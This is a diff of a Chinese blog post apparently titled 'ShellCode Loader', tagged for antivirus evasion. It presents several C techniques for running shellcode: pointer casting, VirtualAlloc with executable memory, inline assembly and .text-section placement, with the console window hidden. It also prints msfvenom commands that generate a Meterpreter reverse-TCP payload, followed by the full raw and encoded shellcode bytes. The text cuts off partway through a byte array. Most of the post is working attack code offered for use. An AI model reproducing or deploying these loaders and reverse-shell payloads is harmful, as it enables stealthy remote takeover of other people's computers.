@@ -1,239 +1,449 @@
-<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>ShellCode Loader(持续更新) - Ghostasky's Blog</title><meta name=author content>
-<meta name=author-link content><meta name=description content><meta name=keywords content='免杀'><meta itemprop=name content="ShellCode Loader(持续更新)"><meta itemprop=description content><meta itemprop=wordCount content="1002"><meta itemprop=keywords content="免杀,"><meta property="og:title" content="ShellCode Loader(持续更新)"><meta property="og:description" content><meta property="og:type" content="article"><meta property="og:url" content="http://ghostasky.github.io/posts/shellcodeloader/"><meta property="article:section" content="posts"><meta name=twitter:card content="summary"><meta name=twitter:title content="ShellCode Loader(持续更新)"><meta name=twitter:description content><meta name=application-name content="FixIt"><meta name=apple-mobile-web-app-title content="FixIt"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=http://ghostasky.github.io/posts/shellcodeloader/><link rel=prev href=http://ghostasky.github.io/posts/ssti/><link rel=next href=http://ghostasky.github.io/posts/powershell/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"ShellCode Loader(持续更新)","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/ghostasky.github.io\/posts\/shellcodeloader\/"},"genre":"posts","keywords":"免杀","wordcount":1002,"url":"http:\/\/ghostasky.github.io\/posts\/shellcodeloader\/","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"作者"},"description":""}</script></head><body data-header-desktop=sticky data-header-mobile=auto><script>(window.localStorage?.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("data-theme","dark")</script><div class=wrapper data-page-style=normal><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Ghostasky's Blog"><img loading=lazy src=/images/fixit.png alt="Ghostasky's Blog" data-title="Ghostasky's Blog" class=logo style="background:url(/images/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e)'><span class=header-title-text>Ghostasky's Blog</span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/posts/>文章</a></li><li class=menu-item><a class=menu-link href=/categories/>分类</a></li><li class=menu-item><a class=menu-link href=/tags/>标签</a></li><li class=menu-item><a class=menu-link href=/about/>关于</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Ghostasky's Blog"><img loading=lazy src=/images/fixit.png alt=/images/fixit.png data-title=/images/fixit.png class=logo style="background:url(/images/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e)'><span class=header-title-text>Ghostasky's Blog</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=menu-item><a class=menu-link href=/posts/>文章</a></li><li class=menu-item><a class=menu-link href=/categories/>分类</a></li><li class=menu-item><a class=menu-link href=/tags/>标签</a></li><li class=menu-item><a class=menu-link href=/about/>关于</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><main class=container><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label=合集></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span>ShellCode Loader(持续更新)</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><span class=author><i class="fa-solid fa-user-circle" aria-hidden=true></i>
-Anonymous</span></span><span class=post-included-in>&nbsp;收录于 <a href=/categories/technology/ class=post-category title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> Technology</a></span></div><div class=post-meta-line><span title="发布于 0001-01-01 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden=true></i><time datetime=0001-01-01>0001-01-01</time></span>&nbsp;<span title="1002 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>约 1100 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>预计阅读 2 分钟</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>目录</span>
-<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#cc>C/C++</a><ul><li><a href=#指针执行>指针执行</a></li><li><a href=#动态分配>动态分配</a></li><li><a href=#内联汇编>内联汇编</a></li><li><a href=#写到text段>写到text段</a></li></ul></li><li><a href=#shellcode>shellcode</a><ul><li><a href=#弹计算器>弹计算器</a></li></ul></li><li><a href=#vscode与visual-studio>vscode与Visual Studio</a></li></ul></nav></div></div><div class=content id=content><p>记录一些语言的shellcode 加载方式，持续更新&mldr;</p><p>[toc]</p><h2 id=cc class=heading-element><a href=#cc class=heading-mark></a>C/C++</h2><p>首先是c的loader，分两种，指针直接执行和动态分配。</p><h3 id=指针执行 class=heading-element><a href=#%e6%8c%87%e9%92%88%e6%89%a7%e8%a1%8c class=heading-mark></a>指针执行</h3><div class=highlight id=id-1><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>##include &lt;stdio.h&gt;
-</span></span></span><span class=line><span class=cl><span class=cp>##include &lt;windows.h&gt;
-</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1>//设置入口地址，不弹出黑窗口
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>## pragma comment(linker,&#34;/subsystem:\&#34;Windows\&#34; /entry:\&#34;mainCRTStartup\&#34;&#34;)
-</span></span></span><span class=line><span class=cl><span class=cp></span>
-</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;shellcode&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>main</span><span class=p>()</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=c1>//都可
-</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//((void(*)()) &amp;shellcode)();
-</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//(*(void(*)()) &amp;shellcode)();
-</span></span></span><span class=line><span class=cl><span class=c1></span>    
-</span></span><span class=line><span class=cl>    <span class=c1>//也可以这样
-</span></span></span><span class=line><span class=cl><span class=c1></span> 	<span class=c1>//void (*func)();
-</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//func = (void (*)())(void *)shellcode;
-</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//func();
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span></span></span></code></pre></div><h3 id=动态分配 class=heading-element><a href=#%e5%8a%a8%e6%80%81%e5%88%86%e9%85%8d class=heading-mark></a>动态分配</h3><div class=highlight id=id-2><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>##include &lt;stdio.h&gt;
-</span></span></span><span class=line><span class=cl><span class=cp>##include &lt;windows.h&gt;
-</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;shellcode&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>	<span class=n>PVOID</span> <span class=n>Memory</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=n>Memory</span> <span class=o>=</span> <span class=nf>VirtualAlloc</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span><span class=k>sizeof</span><span class=p>(</span><span class=n>shellcode</span><span class=p>),</span><span class=n>MEM_COMMIT</span><span class=o>|</span><span class=n>MEM_RESERVE</span><span class=p>,</span><span class=n>PAGE_EXECUTE_READWRITE</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=c1>//动态分配虚地址空间
-</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>Memory</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=k>sizeof</span><span class=p>(</span><span class=n>shellcode</span><span class=p>));</span>
-</span></span><span class=line><span class=cl>    <span class=c1>//复制内存内容
-</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>((</span><span class=kt>void</span><span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=n>Memory</span><span class=p>)();</span>
-</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div><h3 id=内联汇编 class=heading-element><a href=#%e5%86%85%e8%81%94%e6%b1%87%e7%bc%96 class=heading-mark></a>内联汇编</h3><div class=highlight id=id-3><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>##include &lt;windows.h&gt;  
-</span></span></span><span class=line><span class=cl><span class=cp>##include &lt;stdio.h&gt;  
-</span></span></span><span class=line><span class=cl><span class=cp></span>
-</span></span><span class=line><span class=cl><span class=cp>##pragma comment(linker, &#34;/section:.data,RWE&#34;)  
-</span></span></span><span class=line><span class=cl><span class=cp></span>
-</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;shellcode&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>main</span><span class=p>()</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=kr>__asm</span>
-</span></span><span class=line><span class=cl>    <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=n>mov</span> <span class=n>eax</span><span class=p>,</span> <span class=n>offset</span> <span class=n>shellcode</span>
-</span></span><span class=line><span class=cl>        <span class=n>jmp</span> <span class=n>eax</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div><h3 id=写到text段 class=heading-element><a href=#%e5%86%99%e5%88%b0text%e6%ae%b5 class=heading-mark></a>写到text段</h3><div class=highlight id=id-4><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>##pragma section(&#34;.text&#34;)
-</span></span></span><span class=line><span class=cl><span class=cp></span>
-</span></span><span class=line><span class=cl><span class=kr>__declspec</span><span class=p>(</span><span class=nf>allocate</span><span class=p>(</span><span class=s>&#34;.text&#34;</span><span class=p>))</span> <span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\xba\x9f\x20\x22\xd2\xda\xd4\xd9\x74\x24\xf4\x5f\x33\xc9\xb1</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\x30\x83\xc7\x04\x31\x57\x0f\x03\x57\x90\xc2\xd7\x2e\x46\x80</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\x18\xcf\x96\xe5\x91\x2a\xa7\x25\xc5\x3f\x97\x95\x8d\x12\x1b</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\x5d\xc3\x86\xa8\x13\xcc\xa9\x19\x99\x2a\x87\x9a\xb2\x0f\x86</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\x18\xc9\x43\x68\x21\x02\x96\x69\x66\x7f\x5b\x3b\x3f\x0b\xce</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\xac\x34\x41\xd3\x47\x06\x47\x53\xbb\xde\x66\x72\x6a\x55\x31</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\x54\x8c\xba\x49\xdd\x96\xdf\x74\x97\x2d\x2b\x02\x26\xe4\x62</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\xeb\x85\xc9\x4b\x1e\xd7\x0e\x6b\xc1\xa2\x66\x88\x7c\xb5\xbc</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\xf3\x5a\x30\x27\x53\x28\xe2\x83\x62\xfd\x75\x47\x68\x4a\xf1</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\x0f\x6c\x4d\xd6\x3b\x88\xc6\xd9\xeb\x19\x9c\xfd\x2f\x42\x46</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\x9f\x76\x2e\x29\xa0\x69\x91\x96\x04\xe1\x3f\xc2\x34\xa8\x55</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\x15\xca\xd6\x1b\x15\xd4\xd8\x0b\x7e\xe5\x53\xc4\xf9\xfa\xb1</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\xa1\xf6\xb0\x98\x83\x9e\x1c\x49\x96\xc2\x9e\xa7\xd4\xfa\x1c</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\x42\xa4\xf8\x3d\x27\xa1\x45\xfa\xdb\xdb\xd6\x6f\xdc\x48\xd6</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=s>&#34;</span><span class=se>\xa5\xbf\x0f\x44\x25\x40</span><span class=s>&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=p>)())(</span><span class=o>&amp;</span><span class=n>shellcode</span><span class=p>))();</span>
-</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div><h2 id=shellcode class=heading-element><a href=#shellcode class=heading-mark></a>shellcode</h2><p>到kali机的，(自用</p><div class=highlight id=id-5><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=err>➜</span>  <span class=o>~</span> <span class=n>msfvenom</span> <span class=o>-</span><span class=n>p</span> <span class=n>windows</span><span class=o>/</span><span class=n>meterpreter</span><span class=o>/</span><span class=n>reverse_tcp</span> <span class=n>LHOST</span><span class=o>=</span><span class=mf>192.168.188.129</span> <span class=n>LPORT</span><span class=o>=</span><span class=mi>4444</span> <span class=o>-</span><span class=n>a</span> <span class=n>x86</span> <span class=o>--</span><span class=n>platform</span> <span class=n>Windows</span> <span class=o>-</span><span class=n>f</span> <span class=n>c</span>  
-</span></span><span class=line><span class=cl><span class=n>No</span> <span class=n>encoder</span> <span class=n>specified</span><span class=p>,</span> <span class=n>outputting</span> <span class=n>raw</span> <span class=n>payload</span>
-</span></span><span class=line><span class=cl><span class=n>Payload</span> <span class=nl>size</span><span class=p>:</span> <span class=mi>354</span> <span class=n>bytes</span>
-</span></span><span class=line><span class=cl><span class=n>Final</span> <span class=n>size</span> <span class=n>of</span> <span class=n>c</span> <span class=nl>file</span><span class=p>:</span> <span class=mi>1512</span> <span class=n>bytes</span>
-</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>buf</span><span class=p>[]</span> <span class=o>=</span> 
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x0c\x8b\x52\x14\x89\xe5\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31\xc0\xac</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xbc\x81\x68\x02</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5</span><span class=s>&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=err>➜</span>  <span class=o>~</span> <span class=n>msfvenom</span> <span class=o>-</span><span class=n>p</span> <span class=n>windows</span><span class=o>/</span><span class=n>meterpreter</span><span class=o>/</span><span class=n>reverse_tcp</span> <span class=n>LHOST</span><span class=o>=</span><span class=mf>192.168.188.129</span> <span class=n>LPORT</span><span class=o>=</span><span class=mi>4444</span> <span class=o>-</span><span class=n>a</span> <span class=n>x86</span> <span class=o>--</span><span class=n>platform</span> <span class=n>Windows</span> <span class=o>-</span><span class=n>f</span> <span class=n>c</span> <span class=o>--</span><span class=n>bad</span> <span class=s>&#34;</span><span class=se>\x00</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>Found</span> <span class=mi>11</span> <span class=n>compatible</span> <span class=n>encoders</span>
-</span></span><span class=line><span class=cl><span class=n>Attempting</span> <span class=n>to</span> <span class=n>encode</span> <span class=n>payload</span> <span class=n>with</span> <span class=mi>1</span> <span class=n>iterations</span> <span class=n>of</span> <span class=n>x86</span><span class=o>/</span><span class=n>shikata_ga_nai</span>
-</span></span><span class=line><span class=cl><span class=n>x86</span><span class=o>/</span><span class=n>shikata_ga_nai</span> <span class=n>succeeded</span> <span class=n>with</span> <span class=n>size</span> <span class=mi>381</span> <span class=p>(</span><span class=n>iteration</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>x86</span><span class=o>/</span><span class=n>shikata_ga_nai</span> <span class=n>chosen</span> <span class=n>with</span> <span class=n>final</span> <span class=n>size</span> <span class=mi>381</span>
-</span></span><span class=line><span class=cl><span class=n>Payload</span> <span class=nl>size</span><span class=p>:</span> <span class=mi>381</span> <span class=n>bytes</span>
-</span></span><span class=line><span class=cl><span class=n>Final</span> <span class=n>size</span> <span class=n>of</span> <span class=n>c</span> <span class=nl>file</span><span class=p>:</span> <span class=mi>1626</span> <span class=n>bytes</span>
-</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>buf</span><span class=p>[]</span> <span class=o>=</span> 
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xbb\xfb\xb4\xcc\x3f\xda\xd9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x59\x31\x5a\x14\x83\xc2\x04\x03\x5a\x10\x19\x41\x30\xd7\x52</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xaa\xc9\x28\x0c\x9a\x1b\x4c\x47\x8e\xab\x04\xb2\xa4\x9e\x1a</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xb7\xe9\x0a\xa8\xb5\x25\x3c\x19\x73\x10\x73\x9a\xb2\x9c\xdf</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x58\xd5\x60\x22\x8d\x35\x58\xed\xc0\x34\x9d\xbb\xaf\xd9\x73</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x6b\xdb\x77\x64\x18\x99\x4b\x85\xce\x95\xf3\xfd\x6b\x69\x87</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xb1\x72\xba\xec\x02\x6d\xb1\xaa\xb2\xdd\xc4\x99\x36\x14\xb2</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x21\x08\x58\x72\xd2\x5e\x2d\x84\x32\xaf\xf1\x2b\x7b\x1f\xfc</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x32\xbc\x98\x1f\x41\xb6\xda\xa2\x52\x0d\xa0\x78\xd6\x91\x02</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x0a\x40\x75\xb2\xdf\x17\xfe\xb8\x94\x5c\x58\xdd\x2b\xb0\xd3</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xd9\xa0\x37\x33\x68\xf2\x13\x97\x30\xa0\x3a\x8e\x9c\x07\x42</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xd0\x79\xf7\xe6\x9b\x68\xee\x97\x64\x73\x0f\xca\xf2\xbf\xc2</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xf5\x02\xa8\x55\x85\x30\x77\xce\x01\x78\xf0\xc8\xd6\x09\x16</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xeb\x09\xb1\x77\x15\xaa\xc1\x5e\xd2\xfe\x91\xc8\xf3\x7e\x7a</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x09\xfb\xaa\x16\x03\x6b\x95\x4e\xaf\xea\x7d\x8c\xd0\xfd\x21</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x19\x36\xad\x89\x49\xe7\x0e\x7a\x29\x57\xe7\x90\xa6\x88\x17</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x9b\x6d\xa1\xb2\x74\xdb\x99\x2a\xec\x46\x51\xca\xf1\x5d\x1f</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xcc\x7a\x57\xdf\x83\x8a\x12\xf3\xf4\xec\xdc\x0b\x05\x99\xdc</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x61\x01\x0b\x8b\x1d\x0b\x6a\xfb\x81\xf4\x59\x78\xc5\x0b\x1c</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x48\xbd\x3a\x8a\xf4\xa9\x42\x5a\xf4\x29\x15\x30\xf4\x41\xc1</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x60\xa7\x74\x0e\xbd\xd4\x24\x9b\x3e\x8c\x99\x0c\x57\x32\xc7</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x7b\xf8\xcd\x22\xf8\xff\x31\xb0\xd7\xa7\x59\x4a\x68\x58\x99</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x20\x68\x08\xf1\xbf\x47\xa7\x31\x3f\x42\xe0\x59\xca\x03\x42</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xf8\xcb\x09\x02\xa4\xcc\xbe\x9f\x57\xb6\xcf\x20\x98\x47\xc6</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x44\x99\x47\xe6\x7a\xa6\x91\xdf\x08\xe9\x21\x64\x02\x5c\x07</span><span class=s>&#34;</span>
